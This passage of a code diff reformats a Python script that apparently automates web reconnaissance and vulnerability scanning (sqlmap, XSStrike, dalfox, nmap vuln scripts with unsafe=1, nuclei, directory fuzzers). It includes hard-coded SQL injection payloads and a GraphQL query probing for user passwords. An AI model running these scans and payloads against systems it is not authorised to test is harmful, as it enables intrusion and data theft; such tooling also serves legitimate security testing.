Dict[str, str]):\n+    run_cmd(\n+        [\n+            \"httpx\",\n+            \"-l\",\n+            str(input_file),\n+            \"-o\",\n+            str(out_file),\n+            \"-silent\",\n+            \"-follow-redirects\",\n+            \"-mc\",\n+            \"200,201,202,204,301,302,303,307,308,401,403,405,500\",\n+            \"-json\",\n+            \"-title\",\n+            \"-tech-detect\",\n+            \"-sc\",\n+            \"-timeout\",\n+            str(http_timeout),\n+            \"-server\",\n+            \"-cdn\",\n+            \"-pipeline\",\n+            \"-headers\",\n+        ],\n+        env=env,\n+        timeout=1200,\n+        check_return=False,\n+    )\n+\n+\n+def run_gobuster(\n+    target: str, wordlist: Path, out_file: Path, extensions: str, env: Dict[str, str]\n+):\n     if not which(\"gobuster\"):\n         logger.log(\"gobuster not found, skipping\", \"WARNING\")\n         return\n     if not wordlist.exists():\n         logger.log(f\"Wordlist not found: {wordlist}\", \"WARNING\")\n         return\n-    run_cmd([\n-        \"gobuster\", \"dir\", \"-u\", target, \"-w\", str(wordlist),\n-        \"-x\", extensions, \"-o\", str(out_file), \"-q\", \"-k\", \"--no-error\"\n-    ], env=env, timeout=1800, check_return=False)\n+    run_cmd(\n+        [\n+            \"gobuster\",\n+            \"dir\",\n+            \"-u\",\n+            target,\n+            \"-w\",\n+            str(wordlist),\n+            \"-x\",\n+            extensions,\n+            \"-o\",\n+            str(out_file),\n+            \"-q\",\n+            \"-k\",\n+            \"--no-error\",\n+        ],\n+        env=env,\n+        timeout=1800,\n+        check_return=False,\n+    )\n+\n \n def run_dirb(target: str, wordlist: Path, out_file: Path, env: Dict[str, str]):\n     if not which(\"dirb\"):\n         logger.log(\"dirb not found, skipping\", \"WARNING\")\n         return\n     if not wordlist.exists():\n         logger.log(f\"Wordlist not found: {wordlist}\", \"WARNING\")\n         return\n-    run_cmd([\"dirb\", target, str(wordlist), \"-o\", str(out_file), \"-w\"], env=env, timeout=1800, check_return=False)\n+    run_cmd(\n+        [\"dirb\", target, str(wordlist), \"-o\", str(out_file), \"-w\"],\n+        env=env,\n+        timeout=1800,\n+        check_return=False,\n+    )\n+\n \n def run_ffuf(target: str, wordlist: Path, out_file: Path, env: Dict[str, str]):\n     if not which(\"ffu\"):\n         logger.log(\"ffuf not found, skipping\", \"WARNING\")\n         return\n     if not wordlist.exists():\n         logger.log(f\"Wordlist not found: {wordlist}\", \"WARNING\")\n         return\n-    target_fuzz = target.rstrip('/') + '/FUZZ'\n-    run_cmd([\n-        \"ffu\", \"-u\", target_fuzz, \"-w\", str(wordlist),\n-        \"-o\", str(out_file), \"-o\", \"json\", \"-mc\", \"200,201,202,204,301,302,303,307,308,401,403,405\",\n-        \"-fs\", \"0\", \"-t\", \"50\"\n-    ], env=env, timeout=1800, check_return=False)\n+    target_fuzz = target.rstrip(\"/\") + \"/FUZZ\"\n+    run_cmd(\n+        [\n+            \"ffu\",\n+            \"-u\",\n+            target_fuzz,\n+            \"-w\",\n+            str(wordlist),\n+            \"-o\",\n+            str(out_file),\n+            \"-o\",\n+            \"json\",\n+            \"-mc\",\n+            \"200,201,202,204,301,302,303,307,308,401,403,405\",\n+            \"-fs\",\n+            \"0\",\n+            \"-t\",\n+            \"50\",\n+        ],\n+        env=env,\n+        timeout=1800,\n+        check_return=False,\n+    )\n+\n \n def run_waybackurls(domain: str, out_file: Path, env: Dict[str, str]):\n     if not which(\"waybackurls\"):\n         logger.log(\"waybackurls not found, skipping\", \"WARNING\")\n         return\n-    run_cmd([\"waybackurls\", domain], capture=True, env=env, timeout=600, check_return=False)\n+    run_cmd(\n+        [\"waybackurls\", domain], capture=True, env=env, timeout=600, check_return=False\n+    )\n     # Redirect output manually\n     try:\n-        result = run_cmd([\"waybackurls\", domain], capture=True, env=env, timeout=600, check_return=False)\n+        result = run_cmd(\n+            [\"waybackurls\", domain],\n+            capture=True,\n+            env=env,\n+            timeout=600,\n+            check_return=False,\n+        )\n         if result.stdout:\n             atomic_write(out_file, result.stdout)\n     except Exception as e:\n         logger.log(f\"waybackurls error: {e}\", \"WARNING\")\n \n+\n def run_gospider(target: str, out_file: Path, depth: int, env: Dict[str, str]):\n     if not which(\"gospider\"):\n         logger.log(\"gospider not found, skipping\", \"WARNING\")\n         return\n-    run_cmd([\n-        \"gospider\", \"-s\", target, \"-d\", str(depth),\n-        \"-o\", str(out_file.parent), \"--json\", \"-t\", \"10\", \"-k\"\n-    ], env=env, timeout=900, check_return=False)\n+    run_cmd(\n+        [\n+            \"gospider\",\n+            \"-s\",\n+            target,\n+            \"-d\",\n+            str(depth),\n+            \"-o\",\n+            str(out_file.parent),\n+            \"--json\",\n+            \"-t\",\n+            \"10\",\n+            \"-k\",\n+        ],\n+        env=env,\n+        timeout=900,\n+        check_return=False,\n+    )\n+\n \n def run_whatweb(target: str, out_file: Path, env: Dict[str, str]):\n     if not which(\"whatweb\"):\n         logger.log(\"whatweb not found, skipping\", \"WARNING\")\n         return\n-    run_cmd([\n-        \"whatweb\", target, \"--log-json\", str(out_file),\n-        \"-a\", \"3\", \"--max-threads\", \"10\"\n-    ], env=env, timeout=600, check_return=False)\n+    run_cmd(\n+        [\n+            \"whatweb\",\n+            target,\n+            \"--log-json\",\n+            str(out_file),\n+            \"-a\",\n+            \"3\",\n+            \"--max-threads\",\n+            \"10\",\n+        ],\n+        env=env,\n+        timeout=600,\n+        check_return=False,\n+    )\n+\n \n def run_nikto(target: str, out_file: Path, env: Dict[str, str]):\n     if not which(\"nikto\"):\n         logger.log(\"nikto not found, skipping\", \"WARNING\")\n         return\n-    run_cmd([\n-        \"nikto\", \"-h\", target, \"-output\", str(out_file),\n-        \"-Format\", \"json\", \"-Timeout\", \"10\"\n-    ], env=env, timeout=1800, check_return=False)\n+    run_cmd(\n+        [\n+            \"nikto\",\n+            \"-h\",\n+            target,\n+            \"-output\",\n+            str(out_file),\n+            \"-Format\",\n+            \"json\",\n+            \"-Timeout\",\n+            \"10\",\n+        ],\n+        env=env,\n+        timeout=1800,\n+        check_return=False,\n+    )\n+\n \n def run_subjack(subdomains_file: Path, out_file: Path, env: Dict[str, str]):\n     if not which(\"subjack\"):\n         logger.log(\"subjack not found, skipping\", \"WARNING\")\n         return\n     if not subdomains_file.exists():\n         logger.log(f\"Subdomains file not found: {subdomains_file}\", \"WARNING\")\n         return\n-    run_cmd([\n-        \"subjack\", \"-w\", str(subdomains_file), \"-o\", str(out_file),\n-        \"-c\", \"/opt/subjack/fingerprints.json\", \"-v\"\n-    ], env=env, timeout=600, check_return=False)\n+    run_cmd(\n+        [\n+            \"subjack\",\n+            \"-w\",\n+            str(subdomains_file),\n+            \"-o\",\n+            str(out_file),\n+            \"-c\",\n+            \"/opt/subjack/fingerprints.json\",\n+            \"-v\",\n+        ],\n+        env=env,\n+        timeout=600,\n+        check_return=False,\n+    )\n+\n \n def run_sqlmap(target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]):\n     if not which(\"sqlmap\"):\n         logger.log(\"sqlmap not found, skipping\", \"WARNING\")\n         return\n \n     # Get configuration\n     sqlmap_cfg = cfg.get(\"sqlmap_testing\", {})\n \n     cmd = [\n-        \"sqlmap\", \"-u\", target, \"--batch\",\n-        \"--crawl\", str(sqlmap_cfg.get(\"crawl_depth\", 1)),  # Reduced crawl depth\n-        \"--level\", str(sqlmap_cfg.get(\"level\", 2)),        # Reduced level\n-        \"--risk\", str(sqlmap_cfg.get(\"risk\", 2)),\n-        \"--output-dir\", str(out_file.parent),\n-        \"--technique\", sqlmap_cfg.get(\"techniques\", \"BEUST\"),\n-        \"--threads\", str(sqlmap_cfg.get(\"threads\", 2)),    # Reduced threads\n-        \"--timeout\", \"30\",                                 # Add timeout\n-        \"--retries\", \"1\"                                   # Reduce retries\n+        \"sqlmap\",\n+        \"-u\",\n+        target,\n+        \"--batch\",\n+        \"--crawl\",\n+        str(sqlmap_cfg.get(\"crawl_depth\", 1)),  # Reduced crawl depth\n+        \"--level\",\n+        str(sqlmap_cfg.get(\"level\", 2)),  # Reduced level\n+        \"--risk\",\n+        str(sqlmap_cfg.get(\"risk\", 2)),\n+        \"--output-dir\",\n+        str(out_file.parent),\n+        \"--technique\",\n+        sqlmap_cfg.get(\"techniques\", \"BEUST\"),\n+        \"--threads\",\n+        str(sqlmap_cfg.get(\"threads\", 2)),  # Reduced threads\n+        \"--timeout\",\n+        \"30\",  # Add timeout\n+        \"--retries\",\n+        \"1\",  # Reduce retries\n     ]\n \n     # Add tamper scripts if configured\n     tamper_scripts = sqlmap_cfg.get(\"tamper_scripts\", [])\n     if tamper_scripts:\n         cmd.extend([\"--tamper\", \",\".join(tamper_scripts)])\n \n     # Reduced overall timeout to prevent hanging\n     run_cmd(cmd, env=env, timeout=600, check_return=False)\n \n-def run_additional_sql_tests(target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]):\n+\n+def run_additional_sql_tests(\n+    target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]\n+):\n     \"\"\"Run additional SQL injection tests using custom payloads\"\"\"\n     logger.log(f\"Running additional SQL tests for {target}\", \"DEBUG\")\n \n     sql_results = {\n         \"target\": target,\n         \"basic_tests\": [],\n-        \"timestamp\": datetime.now().isoformat()\n+        \"timestamp\": datetime.now().isoformat(),\n     }\n \n     # Basic SQL error detection payloads\n     test_payloads = [\n-        \"'\", \"''\", \"1'\", \"1' OR '1'='1\", \"admin'--\",\n-        \"' OR 1=1--\", \"' UNION SELECT NULL--\", \"1; WAITFOR DELAY '00:00:05'--\"\n+        \"'\",\n+        \"''\",\n+        \"1'\",\n+        \"1' OR '1'='1\",\n+        \"admin'--\",\n+        \"' OR 1=1--\",\n+        \"' UNION SELECT NULL--\",\n+        \"1; WAITFOR DELAY '00:00:05'--\",\n     ]\n \n     try:\n         for payload in test_payloads[:5]:  # Limit to avoid excessive testing\n             test_url = f\"{target}?id={payload}\"\n \n             try:\n                 # Simple test with curl\n-                result = run_cmd([\n-                    \"curl\", \"-s\", \"-m\", \"8\", \"-L\", \"--max-redirs\", \"3\", test_url\n-                ], capture=True, timeout=10, check_return=False)\n+                result = run_cmd(\n+                    [\"curl\", \"-s\", \"-m\", \"8\", \"-L\", \"--max-redirs\", \"3\", test_url],\n+                    capture=True,\n+                    timeout=10,\n+                    check_return=False,\n+                )\n \n                 if result.stdout:\n                     # Look for SQL error patterns\n                     error_patterns = [\n-                        \"mysql_fetch\", \"ora-01\", \"microsoft ole db\", \"syntax error\",\n-                        \"sqlstate\", \"postgresql\", \"warning: mysql\"\n+                        \"mysql_fetch\",\n+                        \"ora-01\",\n+                        \"microsoft ole db\",\n+                        \"syntax error\",\n+                        \"sqlstate\",\n+                        \"postgresql\",\n+                        \"warning: mysql\",\n                     ]\n \n                     response_text = result.stdout.lower()\n                     for pattern in error_patterns:\n                         if pattern in response_text:\n-                            sql_results[\"basic_tests\"].append({\n-                                \"payload\": payload,\n-                                \"error_pattern\": pattern,\n-                                \"potential_sqli\": True\n-                            })\n+                            sql_results[\"basic_tests\"].append(\n+                                {\n+                                    \"payload\": payload,\n+                                    \"error_pattern\": pattern,\n+                                    \"potential_sqli\": True,\n+                                }\n+                            )\n                             break\n             except Exception as e:\n                 logger.log(f\"Error testing SQL payload {payload}: {e}\", \"DEBUG\")\n \n         atomic_write(out_file, json.dumps(sql_results, indent=2))\n \n     except Exception as e:\n         logger.log(f\"Error in additional SQL tests: {e}\", \"WARNING\")\n \n-def run_xss_strike(target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]):\n+\n+def run_xss_strike(\n+    target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]\n+):\n     \"\"\"Run XSStrike for XSS vulnerability testing\"\"\"\n     # Check multiple possible command names for XSStrike\n     xss_strike_cmd = None\n     for cmd_name in [\"xsstrike\", \"xssstrike\", \"XSStrike.py\"]:\n         if which(cmd_name):\n             xss_strike_cmd = cmd_name\n             break\n \n     if not xss_strike_cmd:\n-        logger.log(\"XSStrike not found (tried: xsstrike, xssstrike, XSStrike.py), skipping\", \"WARNING\")\n+        logger.log(\n+            \"XSStrike not found (tried: xsstrike, xssstrike, XSStrike.py), skipping\",\n+            \"WARNING\",\n+        )\n         return\n \n     xss_cfg = cfg.get(\"xss_testing\", {})\n \n     cmd = [xss_strike_cmd, \"-u\", target]\n@@ -4318,28 +5524,36 @@\n \n     if xss_cfg.get(\"crawl\", True):\n         cmd.extend([\"--crawl\", \"--level\", \"2\"])\n \n     # Output to file\n-    result_file = out_file.parent / f\"xsstrike_{target.replace('/', '_').replace(':', '_')}.json\"\n+    result_file = (\n+        out_file.parent / f\"xsstrike_{target.replace('/', '_').replace(':', '_')}.json\"\n+    )\n     cmd.extend([\"-o\", str(result_file)])\n \n     run_cmd(cmd, env=env, timeout=1200, check_return=False)\n+\n \n def run_dalfox(target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]):\n     \"\"\"Run Dalfox for XSS vulnerability testing\"\"\"\n     if not which(\"dalfox\"):\n         logger.log(\"Dalfox not found, skipping\", \"WARNING\")\n         return\n \n     xss_cfg = cfg.get(\"xss_testing\", {})\n \n     cmd = [\n-        \"dalfox\", \"url\", target,\n-        \"--format\", \"json\",\n-        \"--output\", str(out_file),\n-        \"--timeout\", \"10\"\n+        \"dalfox\",\n+        \"url\",\n+        target,\n+        \"--format\",\n+        \"json\",\n+        \"--output\",\n+        str(out_file),\n+        \"--timeout\",\n+        \"10\",\n     ]\n \n     # Add crawling if enabled\n     if xss_cfg.get(\"crawl\", True):\n         cmd.extend([\"--crawl\", \"--crawl-depth\", \"2\"])\n@@ -4348,36 +5562,46 @@\n     if xss_cfg.get(\"blind_xss\", True):\n         cmd.append(\"--blind\")\n \n     run_cmd(cmd, env=env, timeout=600, check_return=False)\n \n-def run_subzy(targets_file: Path, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]):\n+\n+def run_subzy(\n+    targets_file: Path, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]\n+):\n     \"\"\"Run Subzy for subdomain takeover detection\"\"\"\n     if not which(\"subzy\"):\n         logger.log(\"subzy not found, skipping\", \"WARNING\")\n         return\n \n     takeover_cfg = cfg.get(\"subdomain_takeover\", {})\n \n     cmd = [\n-        \"subzy\", \"run\",\n-        \"--targets\", str(targets_file),\n-        \"--concurrency\", str(takeover_cfg.get(\"threads\", 10)),\n-        \"--timeout\", str(takeover_cfg.get(\"timeout\", 30)),\n-        \"--verify_ssl\"\n+        \"subzy\",\n+        \"run\",\n+        \"--targets\",\n+        str(targets_file),\n+        \"--concurrency\",\n+        str(takeover_cfg.get(\"threads\", 10)),\n+        \"--timeout\",\n+        str(takeover_cfg.get(\"timeout\", 30)),\n+        \"--verify_ssl\",\n     ]\n \n     # Run and capture output\n     try:\n         result = run_cmd(cmd, env=env, timeout=600, capture=True, check_return=False)\n         if result.stdout:\n-            with open(out_file, 'w') as f:\n+            with open(out_file, \"w\") as f:\n                 f.write(result.stdout)\n     except Exception as e:\n         logger.log(f\"Subzy execution error: {e}\", \"ERROR\")\n \n-def run_enhanced_nmap(target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]):\n+\n+def run_enhanced_nmap(\n+    target: str, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]\n+):\n     \"\"\"Run enhanced Nmap scanning with advanced options\"\"\"\n     if not which(\"nmap\"):\n         logger.log(\"nmap not found, skipping\", \"WARNING\")\n         return\n \n@@ -4385,15 +5609,19 @@\n     hostname = target.replace(\"http://\", \"\").replace(\"https://\", \"\").split(\"/\")[0]\n \n     # Basic service detection\n     if nmap_cfg.get(\"service_detection\", True):\n         cmd = [\n-            \"nmap\", \"-sS\", \"-sV\",\n-            \"--top-ports\", str(nmap_cfg.get(\"top_ports\", 1000)),\n+            \"nmap\",\n+            \"-sS\",\n+            \"-sV\",\n+            \"--top-ports\",\n+            str(nmap_cfg.get(\"top_ports\", 1000)),\n             \"-T\" + str(nmap_cfg.get(\"timing\", 4)),\n-            \"-oA\", str(out_file.parent / f\"nmap_{hostname}\"),\n-            hostname\n+            \"-oA\",\n+            str(out_file.parent / f\"nmap_{hostname}\"),\n+            hostname,\n         ]\n \n         if nmap_cfg.get(\"os_detection\", True):\n             cmd.insert(-1, \"-O\")\n \n@@ -4403,18 +5631,29 @@\n         run_cmd(cmd, env=env, timeout=1800, check_return=False)\n \n     # Vulnerability scripts\n     if nmap_cfg.get(\"vulnerability_scripts\", True):\n         vuln_cmd = [\n-            \"nmap\", \"--script\", \"vuln\",\n-            \"--script-args\", \"unsafe=1\",\n-            \"-oA\", str(out_file.parent / f\"nmap_vuln_{hostname}\"),\n-            hostname\n+            \"nmap\",\n+            \"--script\",\n+            \"vuln\",\n+            \"--script-args\",\n+            \"unsafe=1\",\n+            \"-oA\",\n+            str(out_file.parent / f\"nmap_vuln_{hostname}\"),\n+            hostname,\n         ]\n         run_cmd(vuln_cmd, env=env, timeout=2400, check_return=False)\n \n-def run_feroxbuster(target: str, wordlist: Path, out_file: Path, env: Dict[str, str], cfg: Dict[str, Any]):\n+\n+def run_feroxbuster(\n+    target: str,\n+    wordlist: Path,\n+    out_file: Path,\n+    env: Dict[str, str],\n+    cfg: Dict[str, Any],\n+):\n     \"\"\"Run feroxbuster for directory discovery\"\"\"\n     if not which(\"feroxbuster\"):\n         logger.log(\"feroxbuster not found, skipping\", \"WARNING\")\n         return\n     if not wordlist.exists():\n@@ -4423,16 +5662,21 @@\n \n     fuzzing_cfg = cfg.get(\"fuzzing\", {})\n \n     cmd = [\n         \"feroxbuster\",\n-        \"-u\", target,\n-        \"-w\", str(wordlist),\n-        \"-o\", str(out_file),\n-        \"-t\", str(fuzzing_cfg.get(\"threads\", 50)),\n-        \"-s\", fuzzing_cfg.get(\"status_codes\", \"200,204,301,302,307,308,401,403,405,500\"),\n-        \"--auto-tune\"\n+        \"-u\",\n+        target,\n+        \"-w\",\n+        str(wordlist),\n+        \"-o\",\n+        str(out_file),\n+        \"-t\",\n+        str(fuzzing_cfg.get(\"threads\", 50)),\n+        \"-s\",\n+        fuzzing_cfg.get(\"status_codes\", \"200,204,301,302,307,308,401,403,405,500\"),\n+        \"--auto-tune\",\n     ]\n \n     # Add extensions if configured\n     extensions = fuzzing_cfg.get(\"extensions\", \"\")\n     if extensions:\n@@ -4442,23 +5686,35 @@\n     if fuzzing_cfg.get(\"recursive_fuzzing\", True):\n         cmd.extend([\"-r\", \"-d\", \"3\"])\n \n     run_cmd(cmd, env=env, timeout=1800, check_return=False)\n \n-def run_nuclei_single_target(target: str, out_file: Path, cfg: Dict[str, Any], env: Dict[str, str]):\n+\n+def run_nuclei_single_target(\n+    target: str, out_file: Path, cfg: Dict[str, Any], env: Dict[str, str]\n+):\n     if not which(\"nuclei\") or not cfg[\"nuclei\"][\"enabled\"]:\n         logger.log(\"nuclei not found or disabled, skipping\", \"WARNING\")\n         return\n \n     nuclei_cfg = cfg[\"nuclei\"]\n \n     cmd = [\n-        \"nuclei\", \"-u\", target, \"-json\", \"-o\", str(out_file),\n-        \"-severity\", nuclei_cfg[\"severity\"],\n-        \"-rl\", str(nuclei_cfg[\"rps\"]),\n-        \"-c\", str(nuclei_cfg[\"conc\"]),\n-        \"-silent\", \"-no-color\"\n+        \"nuclei\",\n+        \"-u\",\n+        target,\n+        \"-json\",\n+        \"-o\",\n+        str(out_file),\n+        \"-severity\",\n+        nuclei_cfg[\"severity\"],\n+        \"-rl\",\n+        str(nuclei_cfg[\"rps\"]),\n+        \"-c\",\n+        str(nuclei_cfg[\"conc\"]),\n+        \"-silent\",\n+        \"-no-color\",\n     ]\n \n     # Add community template sources\n     if nuclei_cfg.get(\"community_templates\", True):\n         template_sources = nuclei_cfg.get(\"template_sources\", [])\n@@ -4490,197 +5746,287 @@\n         for exclude in exclude_templates:\n             cmd.extend([\"-exclude-tags\", exclude])\n \n     run_cmd(cmd, env=env, timeout=3600, check_return=False)\n \n+\n def run_dns_enumeration(domain: str, out_file: Path, env: Dict[str, str]):\n     \"\"\"Enhanced DNS enumeration with multiple record types\"\"\"\n     dns_info = {\n         \"domain\": domain,\n         \"records\": {},\n         \"nameservers\": [],\n         \"mx_records\": [],\n-        \"txt_records\": []\n+        \"txt_records\": [],\n     }\n \n     record_types = [\"A\", \"AAAA\", \"CNAME\", \"MX\", \"NS\", \"TXT\", \"SOA\", \"PTR\"]\n \n     for record_type in record_types:\n         try:\n-            result = run_cmd([\"dig\", \"+short\", record_type, domain], capture=True, timeout=30, check_return=False)\n+            result = run_cmd(\n+                [\"dig\", \"+short\", record_type, domain],\n+                capture=True,\n+                timeout=30,\n+                check_return=False,\n+            )\n             if result.stdout and result.stdout.strip():\n-                dns_info[\"records\"][record_type] = result.stdout.strip().split('\\n')\n+                dns_info[\"records\"][record_type] = result.stdout.strip().split(\"\\n\")\n         except Exception as e:\n             logger.log(f\"DNS lookup error for {record_type} {domain}: {e}\", \"DEBUG\")\n \n     atomic_write(out_file, json.dumps(dns_info, indent=2))\n+\n \n def run_ssl_analysis(target: str, out_file: Path, env: Dict[str, str]):\n     \"\"\"SSL/TLS certificate analysis\"\"\"\n     if not target.startswith(\"https://\"):\n         target = f\"https://{target}\"\n \n-    ssl_info = {\n-        \"target\": target,\n-        \"certificate\": {},\n-        \"ciphers\": [],\n-        \"protocols\": []\n-    }\n+    ssl_info = {\"target\": target, \"certificate\": {}, \"ciphers\": [], \"protocols\": []}\n \n     try:\n         # Use openssl to get certificate info\n         hostname = target.replace(\"https://\", \"\").split(\"/\")[0]\n-        result = run_cmd([\n-            \"openssl\", \"s_client\", \"-connect\", f\"{hostname}:443\",\n-            \"-servername\", hostname, \"-showcerts\"\n-        ], capture=True, timeout=30, check_return=False, use_shell=False)\n+        result = run_cmd(\n+            [\n+                \"openssl\",\n+                \"s_client\",\n+                \"-connect\",\n+                f\"{hostname}:443\",\n+                \"-servername\",\n+                hostname,\n+                \"-showcerts\",\n+            ],\n+            capture=True,\n+            timeout=30,\n+            check_return=False,\n+            use_shell=False,\n+        )\n \n         if result.stdout:\n             ssl_info[\"raw_output\"] = result.stdout\n \n         atomic_write(out_file, json.dumps(ssl_info, indent=2))\n     except Exception as e:\n         logger.log(f\"SSL analysis error for {target}: {e}\", \"WARNING\")\n \n+\n def run_network_analysis(target: str, out_dir: Path, env: Dict[str, str]):\n     \"\"\"Comprehensive network analysis\"\"\"\n     out_dir.mkdir(exist_ok=True)\n \n     # Clean hostname from target\n     hostname = target.replace(\"http://\", \"\").replace(\"https://\", \"\").split(\"/\")[0]\n \n     # Whois lookup\n     if which(\"whois\"):\n         try:\n-            result = run_cmd([\"whois\", hostname], capture=True, timeout=60, check_return=False)\n+            result = run_cmd(\n+                [\"whois\", hostname], capture=True, timeout=60, check_return=False\n+            )\n             if result.stdout:\n                 atomic_write(out_dir / \"whois.txt\", result.stdout)\n         except Exception as e:\n             logger.log(f\"Whois error for {hostname}: {e}\", \"WARNING\")\n \n     # Traceroute\n     if which(\"traceroute\"):\n         try:\n-            result = run_cmd([\"traceroute\", \"-m\", \"15\", hostname], capture=True, timeout=120, check_return=False)\n+            result = run_cmd(\n+                [\"traceroute\", \"-m\", \"15\", hostname],\n+                capture=True,\n+                timeout=120,\n+                check_return=False,\n+            )\n             if result.stdout:\n                 atomic_write(out_dir / \"traceroute.txt\", result.stdout)\n         except Exception as e:\n             logger.log(f\"Traceroute error for {hostname}: {e}\", \"WARNING\")\n \n     # ASN lookup using dig\n     try:\n-        result = run_cmd([\"dig\", \"+short\", hostname], capture=True, timeout=30, check_return=False)\n+        result = run_cmd(\n+            [\"dig\", \"+short\", hostname], capture=True, timeout=30, check_return=False\n+        )\n         if result.stdout:\n-            ip = result.stdout.strip().split('\\n')[0]\n+            ip = result.stdout.strip().split(\"\\n\")[0]\n             if ip:\n                 # Reverse IP for ASN lookup\n-                reversed_ip = '.'.join(ip.split('.')[::-1])\n-                asn_result = run_cmd([\"dig\", \"+short\", f\"{reversed_ip}.origin.asn.cymru.com\", \"TXT\"],\n-                                   capture=True, timeout=30, check_return=False)\n+                reversed_ip = \".\".join(ip.split(\".\")[::-1])\n+                asn_result = run_cmd(\n+                    [\"dig\", \"+short\", f\"{reversed_ip}.origin.asn.cymru.com\", \"TXT\"],\n+                    capture=True,\n+                    timeout=30,\n+                    check_return=False,\n+                )\n                 if asn_result.stdout:\n-                    atomic_write(out_dir / \"asn_info.txt\", f\"IP: {ip}\\nASN: {asn_result.stdout}\")\n+                    atomic_write(\n+                        out_dir / \"asn_info.txt\", f\"IP: {ip}\\nASN: {asn_result.stdout}\"\n+                    )\n     except Exception as e:\n         logger.log(f\"ASN lookup error for {hostname}: {e}\", \"WARNING\")\n+\n \n def run_api_discovery(target: str, out_file: Path, env: Dict[str, str]):\n     \"\"\"Enhanced API endpoint discovery and analysis\"\"\"\n     try:\n         logger.log(f\"API discovery for {target}\", \"INFO\")\n         results = []\n \n         # Common API endpoints\n         api_endpoints = [\n-            \"/api\", \"/api/v1\", \"/api/v2\", \"/rest\", \"/graphql\",\n-            \"/swagger\", \"/swagger.json\", \"/openapi.json\", \"/api-docs\",\n-            \"/docs\", \"/documentation\", \"/spec\", \"/.well-known\",\n-            \"/health\", \"/status\", \"/metrics\", \"/admin\"\n+            \"/api\",\n+            \"/api/v1\",\n+            \"/api/v2\",\n+            \"/rest\",\n+            \"/graphql\",\n+            \"/swagger\",\n+            \"/swagger.json\",\n+            \"/openapi.json\",\n+            \"/api-docs\",\n+            \"/docs\",\n+            \"/documentation\",\n+            \"/spec\",\n+            \"/.well-known\",\n+            \"/health\",\n+            \"/status\",\n+            \"/metrics\",\n+            \"/admin\",\n         ]\n \n         for endpoint in api_endpoints:\n             try:\n                 if which(\"curl\"):\n                     test_url = f\"{target.rstrip('/')}{endpoint}\"\n-                    result = run_cmd([\"curl\", \"-s\", \"-I\", \"-L\", \"--max-time\", \"10\", test_url],\n-                                   capture=True, timeout=15, check_return=False)\n-                    if result.stdout and (\"200\" in result.stdout or \"swagger\" in result.stdout.lower() or \"api\" in result.stdout.lower()):\n-                        results.append({\n-                            \"endpoint\": endpoint,\n-                            \"url\": test_url,\n-                            \"response_headers\": result.stdout.strip(),\n-                            \"discovered\": datetime.now().isoformat()\n-                        })\n+                    result = run_cmd(\n+                        [\"curl\", \"-s\", \"-I\", \"-L\", \"--max-time\", \"10\", test_url],\n+                        capture=True,\n+                        timeout=15,\n+                        check_return=False,\n+                    )\n+                    if result.stdout and (\n+                        \"200\" in result.stdout\n+                        or \"swagger\" in result.stdout.lower()\n+                        or \"api\" in result.stdout.lower()\n+                    ):\n+                        results.append(\n+                            {\n+                                \"endpoint\": endpoint,\n+                                \"url\": test_url,\n+                                \"response_headers\": result.stdout.strip(),\n+                                \"discovered\": datetime.now().isoformat(),\n+                            }\n+                        )\n             except Exception:\n                 continue\n \n         # Save results\n         atomic_write(out_file, json.dumps(results, indent=2))\n         logger.log(f\"Found {len(results)} potential API endpoints\", \"SUCCESS\")\n \n     except Exception as e:\n         logger.log(f\"API discovery error: {e}\", \"ERROR\")\n+\n \n def run_graphql_testing(target: str, out_file: Path, env: Dict[str, str]):\n     \"\"\"GraphQL security testing\"\"\"\n     try:\n         logger.log(f\"GraphQL testing for {target}\", \"INFO\")\n         results = {}\n \n-        graphql_endpoints = [\"/graphql\", \"/graphiql\", \"/api/graphql\", \"/v1/graphql\", \"/query\"]\n+        graphql_endpoints = [\n+            \"/graphql\",\n+            \"/graphiql\",\n+            \"/api/graphql\",\n+            \"/v1/graphql\",\n+            \"/query\",\n+        ]\n \n         for endpoint in graphql_endpoints:\n             try:\n                 if which(\"curl\"):\n                     test_url = f\"{target.rstrip('/')}{endpoint}\"\n \n                     # Test for introspection\n                     introspection_query = {\"query\": \"{ __schema { types { name } } }\"}\n-                    result = run_cmd([\n-                        \"curl\", \"-s\", \"-X\", \"POST\",\n-                        \"-H\", \"Content-Type: application/json\",\n-                        \"-d\", json.dumps(introspection_query),\n-                        \"--max-time\", \"10\", test_url\n-                    ], capture=True, timeout=15, check_return=False)\n-\n-                    if result.stdout and (\"__schema\" in result.stdout or \"types\" in result.stdout):\n+                    result = run_cmd(\n+                        [\n+                            \"curl\",\n+                            \"-s\",\n+                            \"-X\",\n+                            \"POST\",\n+                            \"-H\",\n+                            \"Content-Type: application/json\",\n+                            \"-d\",\n+                            json.dumps(introspection_query),\n+                            \"--max-time\",\n+                            \"10\",\n+                            test_url,\n+                        ],\n+                        capture=True,\n+                        timeout=15,\n+                        check_return=False,\n+                    )\n+\n+                    if result.stdout and (\n+                        \"__schema\" in result.stdout or \"types\" in result.stdout\n+                    ):\n                         results[endpoint] = {\n                             \"introspection_enabled\": True,\n                             \"response\": result.stdout.strip(),\n-                            \"url\": test_url\n+                            \"url\": test_url,\n                         }\n \n                     # Test for common GraphQL vulnerabilities\n                     test_queries = [\n                         '{ __type(name: \"User\") { fields { name type { name } } } }',\n-                        'query { users { id email password } }'\n+                        \"query { users { id email password } }\",\n                     ]\n \n                     for query in test_queries:\n                         test_query = {\"query\": query}\n-                        result = run_cmd([\n-                            \"curl\", \"-s\", \"-X\", \"POST\",\n-                            \"-H\", \"Content-Type: application/json\",\n-                            \"-d\", json.dumps(test_query),\n-                            \"--max-time\", \"5\", test_url\n-                        ], capture=True, timeout=10, check_return=False)\n+                        result = run_cmd(\n+                            [\n+                                \"curl\",\n+                                \"-s\",\n+                                \"-X\",\n+                                \"POST\",\n+                                \"-H\",\n+                                \"Content-Type: application/json\",\n+                                \"-d\",\n+                                json.dumps(test_query),\n+                                \"--max-time\",\n+                                \"5\",\n+                                test_url,\n+                            ],\n+                            capture=True,\n+                            timeout=10,\n+                            check_return=False,\n+                        )\n \n                         if result.stdout and \"data\" in 